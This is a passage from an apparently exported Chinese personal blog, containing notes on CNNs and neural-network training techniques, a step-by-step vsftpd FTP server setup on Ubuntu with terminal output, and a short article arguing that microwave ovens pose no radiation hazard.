title="具有代表性的CNN"></a>具有代表性的CNN</h3><ul><li><p>LeNet</p><p>是进行手写数字识别的网络，具有连续的卷积层和池化层，最后经全连接层输出结果</p><p>不同点</p><ul><li><p>激活函数不同</p><p>LeNet使用sigmoid函数，而现在的CNN主要使用ReLU函数</p></li><li><p>在缩小中间数据的大小时采用的方法不同</p><p>原始的LeNet中使用子采样(subsampling)，而现在的CNN大多使用Max池化</p></li></ul></li><li><p>AlexNet</p><p>在结构上与LeNet基本没有什么不同</p><p>与LeNet的差异</p><ul><li>激活函数使用ReLU</li><li>使用进行局部正规化的LRN(Local Response Normalization)层</li><li>使用Dropout</li></ul></li></ul><h3 id="Data-Augmentation-数据扩充"><a href="#Data-Augmentation-数据扩充" class="headerlink" title="Data Augmentation(数据扩充)"></a>Data Augmentation(数据扩充)</h3><p>基于算法“人为地”扩充输入图像（训练图像），如施加旋转、垂直或水平方向上的移动等微小变化，以此增加图像的数量</p><h3 id="加深层的好处"><a href="#加深层的好处" class="headerlink" title="加深层的好处"></a>加深层的好处</h3><ul><li><p>减少网络的参数数量</p><p>与没有加深层的网络相比，加深了层的网络可以用更少的参数达到同等水平（或者更强）的表现力</p></li><li><p>使学习更加高效</p><p>随着层的加深，神经元会对更复杂的东西有响应</p></li><li><p>可以分层次地分解需要学习的问题</p></li><li><p>可以分层次地传递信息</p></li></ul><h3 id="感受野-receptive-field"><a href="#感受野-receptive-field" class="headerlink" title="感受野(receptive field)"></a>感受野(receptive field)</h3><p>给神经元施加变化的某个局部空间区域</p><h3 id="ImageNet"><a href="#ImageNet" class="headerlink" title="ImageNet"></a>ImageNet</h3><p>一个拥有超过100万张图像的数据集</p><h3 id="在深度学习中比较知名的网络"><a href="#在深度学习中比较知名的网络" class="headerlink" title="在深度学习中比较知名的网络"></a>在深度学习中比较知名的网络</h3><ul><li>VGG</li><li>GoogLeNet</li><li>ResNet</li></ul><h3 id="深度学习中高速化的问题"><a href="#深度学习中高速化的问题" class="headerlink" title="深度学习中高速化的问题"></a>深度学习中高速化的问题</h3><p>在深度学习中大部分时间都耗费在卷积层上</p><h3 id="基于GPU的高速化"><a href="#基于GPU的高速化" class="headerlink" title="基于GPU的高速化"></a>基于GPU的高速化</h3><p>深度学习中需要进行大量的乘积累加计算，而这正是GPU所擅长的，故可使用GPU来进行深度学习的运算以提高学习速度</p><h3 id="分布式学习"><a href="#分布式学习" class="headerlink" title="分布式学习"></a>分布式学习</h3><p>为了进一步提高深度学习所需的计算的速度，可以考虑在多个GPU或者多台机器上进行分布式计算</p>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出、AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ftp文件服务器搭建</title>
      <link href="2021/12/16/ftp_server/"/>
      <url>2021/12/16/ftp_server/</url>
      
        <content type="html"><![CDATA[<h2 id="第一步：更新软件列表"><a href="#第一步：更新软件列表" class="headerlink" title="第一步：更新软件列表"></a>第一步：更新软件列表</h2><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">zh@ubuntu:~$ sudo apt update</span><br><span class="line">[sudo] password for zh: </span><br><span class="line">Hit:1 http://cn.archive.ubuntu.com/ubuntu focal InRelease</span><br><span class="line">Get:2 http://cn.archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]</span><br><span class="line">Get:3 http://cn.archive.ubuntu.com/ubuntu focal-backports InRelease [108 kB]</span><br><span class="line">Get:4 http://cn.archive.ubuntu.com/ubuntu focal-security InRelease [114 kB]</span><br><span class="line">Get:5 http://cn.archive.ubuntu.com/ubuntu focal-updates/main amd64 Packages [1,397 kB]</span><br><span class="line">Get:6 http://cn.archive.ubuntu.com/ubuntu focal-updates/universe amd64 Packages [883 kB]                                       </span><br><span class="line">Fetched 2,615 kB in 10s (271 kB/s)                                                                                             </span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">49 packages can be upgraded. Run &#x27;apt list --upgradable&#x27; to see them.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第二步：安装vsftpd"><a href="#第二步：安装vsftpd" class="headerlink" title="第二步：安装vsftpd"></a>第二步：安装vsftpd</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">zh@ubuntu:~$ sudo apt install vsftpd</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">The following additional packages will be installed:</span><br><span class="line">  ssl-cert</span><br><span class="line">Suggested packages:</span><br><span class="line">  openssl-blacklist</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  ssl-cert vsftpd</span><br><span class="line">0 upgraded, 2 newly installed, 0 to remove and 49 not upgraded.</span><br><span class="line">Need to get 132 kB of archives.</span><br><span class="line">After this operation, 402 kB of additional disk space will be used.</span><br><span class="line">Do you want to continue? [Y/n] y</span><br><span class="line">Get:1 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 ssl-cert all 1.0.39 [17.0 kB]</span><br><span class="line">Get:2 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 vsftpd amd64 3.0.3-12 [115 kB]</span><br><span class="line">Fetched 132 kB in 3s (50.0 kB/s) </span><br><span class="line">Preconfiguring packages ...</span><br><span class="line">Selecting previously unselected package ssl-cert.</span><br><span class="line">(Reading database ... 71512 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../ssl-cert_1.0.39_all.deb ...</span><br><span class="line">Unpacking ssl-cert (1.0.39) </span><br><span class="line">Selecting previously unselected package vsftpd..............................................................................] </span><br><span class="line">Preparing to unpack .../vsftpd_3.0.3-12_amd64.deb ...</span><br><span class="line">Unpacking vsftpd (3.0.3-12) ...######################.......................................................................] </span><br><span class="line">Setting up ssl-cert (1.0.39) ...#################################...........................................................] </span><br><span class="line">Progress: [ 56%] [##########################################################................................................] </span><br><span class="line">Setting up vsftpd (3.0.3-12) ...########################################################....................................] </span><br><span class="line">Created symlink /etc/systemd/system/multi-user.target.wants/vsftpd.service → /lib/systemd/system/vsftpd.service.............] </span><br><span class="line">Processing triggers for man-db (2.9.1-1) </span><br><span class="line">Processing triggers for systemd (245.4-4ubuntu3.11) ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第三步：添加用户"><a href="#第三步：添加用户" class="headerlink" title="第三步：添加用户"></a>第三步：添加用户</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zh@ubuntu:~$ sudo nano /etc/vsftpd.conf</span><br><span class="line">zh@ubuntu:~$ sudo useradd -m ftpuser</span><br><span class="line">zh@ubuntu:~$ sudo passwd ftpuser</span><br><span class="line">New password: </span><br><span class="line">Retype new password: </span><br><span class="line">passwd: password updated successfully</span><br></pre></td></tr></table></figure><h2 id="第四步：测试"><a href="#第四步：测试" class="headerlink" title="第四步：测试"></a>第四步：测试</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/zh# echo &quot;TEST&quot; &gt; ../ftpuser/test.txt</span><br></pre></td></tr></table></figure><p><a href="https://www.helloimg.com/image/G9PfZv"><img src="https://www.helloimg.com/images/2021/12/16/G9PfZv.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/16/G9PfZv.png" srcset="data:image/png;base64,666" alt="G9PfZv.png"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 3</title>
      <link href="2021/12/11/deep_learning_from_scratch_3/"/>
      <url>2021/12/11/deep_learning_from_scratch_3/</url>
      
        <content type="html"><![CDATA[<h2 id="误差反向传播法"><a href="#误差反向传播法" class="headerlink" title="误差反向传播法"></a>误差反向传播法</h2><a id="more"></a><h3 id="Affine-层（仿射变换）"><a href="#Affine-层（仿射变换）" class="headerlink" title="Affine 层（仿射变换）"></a>Affine 层（仿射变换）</h3><blockquote><p>神经网络的正向传播中进行的矩阵的乘积运算在几何学领域被称为“仿射变换”</p></blockquote><p>​    注：在affine层的反向传播过程中要注意矩阵形状</p><h3 id="梯度确认-gradient-check"><a href="#梯度确认-gradient-check" class="headerlink" title="梯度确认(gradient check)"></a>梯度确认(gradient check)</h3><blockquote><p>确认数值微分求出的梯度结果和误差反向传播法求出的结果是否一致的操作</p></blockquote><p>​    用于确认误差反向传播法的实现是否正确</p><h2 id="与学习相关的技巧"><a href="#与学习相关的技巧" class="headerlink" title="与学习相关的技巧"></a>与学习相关的技巧</h2><h3 id="最优化"><a href="#最优化" class="headerlink" title="最优化"></a>最优化</h3><blockquote><p>解决“寻找最优参数的问题”的过程</p></blockquote><h3 id="SGD"><a href="#SGD" class="headerlink" title="SGD"></a>SGD</h3><blockquote><p>$$<br>W= W-η\frac{\partial L}{\partial W}<br>$$</p></blockquote><p><strong>缺点</strong></p><blockquote><p>如果函数的形状非均向(anisotropic)，搜索的路径就会非常低效</p><p>抵消的根本原因：梯度的方向并没有指向最小值的方向</p></blockquote><h3 id="Momentum"><a href="#Momentum" class="headerlink" title="Momentum"></a>Momentum</h3><blockquote><p>$$<br>v=\alpha v - \eta \frac{\partial L}{\partial W}<br>$$</p><p>$$<br>W=W+v<br>$$</p></blockquote><h3 id="AdaGrad"><a href="#AdaGrad" class="headerlink" title="AdaGrad"></a>AdaGrad</h3><blockquote><p>$$<br>h=h+\frac{\partial L}{\partial W} .\frac{\partial L}{\partial W}<br>$$</p><p>$$<br>W=W-\eta \frac{1}{h^{\frac{1}{2}}}\frac{\partial L}{\partial W}<br>$$</p></blockquote><p>​    AdaGrad会记录过去所有梯度的平方和。因此，学习越深入，更新的幅度就越小。实际上，如果无止境的学习，更新量就会变成零</p><h3 id="Adam"><a href="#Adam" class="headerlink" title="Adam"></a>Adam</h3><blockquote><p>融合了Momentum和AdaGrad方法。通过组合前面两个方法的优点，有望实现参数空间的高效搜索</p><p>特征：超参数的“偏置校正”</p></blockquote><h3 id="权重的初始值"><a href="#权重的初始值" class="headerlink" title="权重的初始值"></a>权重的初始值</h3><p>​    将权重设置为0的问题</p><p>​    如果将权重设置为零，那么下一层的神经元会杯传递相同的值，从而达不到学习的效果（乘法反向传播的例子），则在反向传播时第二层的权重进行同样的更新，这使得神经网络拥有许多不同的权重的意义丧失了。即防止“权重均一化”（瓦解权重的对称结构）</p><h3 id="梯度消失（梯度爆炸）"><a href="#梯度消失（梯度爆炸）" class="headerlink" title="梯度消失（梯度爆炸）"></a>梯度消失（梯度爆炸）</h3><p>在运用链式法则时，由于运算时以连乘的形式进行，所以当层数很深时，随着层数的增加，计算出的梯度会指数级变化，如果是往小了变，就出现了<strong>梯度消失</strong>现象，如果是往大了变，就出现了<strong>梯度爆炸</strong>现象</p><h3 id="表现力受限"><a href="#表现力受限" class="headerlink" title="表现力受限"></a>表现力受限</h3><p>当传递给神经元的是有所偏向的数据时，有可能会出现<strong>表现力受限</strong>的问题，即多个神经元输出相同的结果，那同样可以由一个神经元完成的事情无疑令这些神经元的存在变得无意义</p><h3 id="Xavier初始值"><a href="#Xavier初始值" class="headerlink" title="Xavier初始值"></a>Xavier初始值</h3><blockquote><p>如果前一层的节点数为n，则初始值使用标准差为1/(n^(1/2))的分布</p></blockquote><h3 id="ReLU的权重初始值"><a href="#ReLU的权重初始值" class="headerlink" title="ReLU的权重初始值"></a>ReLU的权重初始值</h3><blockquote><p>当激活函数使用ReLU时，一般推荐使用ReLU专用的初始值，也称为“He初始值”</p><p>He初始值使用标准差为(2/n)^(1/2)的高斯分布</p></blockquote><h3 id="Batch-Nomalization-Batch-Norm"><a href="#Batch-Nomalization-Batch-Norm" class="headerlink" title="Batch Nomalization (Batch Norm)"></a>Batch Nomalization (Batch Norm)</h3><blockquote><p>以进行学习时的mini-batch为单位，按mini-batch进行正规化</p><p>进行使数据分布的均值为0，方差为1的正规化<br>$$<br>\mu <em>B=\frac{1}{m}\Sigma^m</em>{i=1}x_i<br>$$</p><p>$$<br>\sigma ^2_B=\frac{1}{m}\Sigma^m_{i=1}(x_i-\mu_B)^2<br>$$</p><p>$$<br>x_i=\frac{x_i-\mu_B}{\sqrt{\sigma_B^2+\epsilon}}<br>$$</p></blockquote><p>优点：</p><ul><li>可以使学习快速进行（可以增大学习率）</li><li>不那么依赖初始值（对于初始值不用那么神经质）</li><li>抑制过拟合（降低Dropou等的必要性）</li></ul><h3 id="过拟合"><a href="#过拟合" class="headerlink" title="过拟合"></a>过拟合</h3><blockquote><p>只能拟合训练数据，但不能很好地拟合不包含在训练数据中的其他数据的状态</p></blockquote><p>原因</p><ul><li> 模型拥有大量参数，表现力强</li><li>训练数据少</li></ul><h3 id="权值衰减"><a href="#权值衰减" class="headerlink" title="权值衰减"></a>权值衰减</h3><blockquote><p>通过在学习的过程中对大的权重进行惩罚，来抑制过拟合</p></blockquote><p>例：为损失函数加上权重的平方范数（1/2λW^2）</p><h3 id="Dropout"><a href="#Dropout" class="headerlink" title="Dropout"></a>Dropout</h3><blockquote><p>Dropout是一种在学习的过程中随机删除神经元的方法。训练时，随机选出隐藏层的神经元，然后将其删除。被删除的神经元不再进行信号的传递</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出、AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微波炉究竟有没有辐射</title>
      <link href="2021/11/30/microwave_oven/"/>
      <url>2021/11/30/microwave_oven/</url>
      
        <content type="html"><![CDATA[<blockquote><p>震惊！这个常见的家用电器竟有这么大的辐射</p></blockquote><a id="more"></a><h2 id="直奔主题，微波炉对人体究竟会不会产生危害"><a href="#直奔主题，微波炉对人体究竟会不会产生危害" class="headerlink" title="直奔主题，微波炉对人体究竟会不会产生危害"></a>直奔主题，微波炉对人体究竟会不会产生危害</h2><p>要知道微波炉是否会对人体产生危害，就得先知道什么程度的微波会对人体产生危害</p><blockquote><img src="https://www.helloimg.com/images/2021/11/30/Ga0JEt.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga0JEt.png" srcset="data:image/png;base64,666" alt="Ga0JEt.png" style="zoom:50%;" /><img src="https://www.helloimg.com/images/2021/11/30/Ga0xjQ.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga0xjQ.png" srcset="data:image/png;base64,666" alt="Ga0xjQ.png" style="zoom:50%;" /></blockquote><p>可以看出，只要50mm以外泄露的微波小于等于50W/m^2，就不会对人体造成影响，而市面上的绝大多数微波炉也都满足这一标准，即使在使用了一段时间后，虽然门把手及炉门密封处微波泄漏量略有上升，但也都在标准以内</p><p>顺便说一声，微波炉的产生的辐射属于非电离辐射，并不能破坏分子结构和产生电离作用；频率在2.45GHz左右，也就WIFI的频率，而且微波炉是在金属容器中工作的，这些金属容器能够很好地限制微波</p><p><strong>所以，微波炉不会对人体造成伤害</strong></p><h2 id="问题解答"><a href="#问题解答" class="headerlink" title="问题解答"></a>问题解答</h2><h4 id="微波炉泄漏的辐射会致畸？"><a href="#微波炉泄漏的辐射会致畸？" class="headerlink" title="微波炉泄漏的辐射会致畸？"></a>微波炉泄漏的辐射会致畸？</h4><details ><summary> 点击查看答案 </summary>              <div class='content'>              <p>同样是2.45GHz左右的频率，既然WIFI没有致畸作用，想必微波炉也不具备这样的能力</p><p><img src="data:image/jpeg;base64,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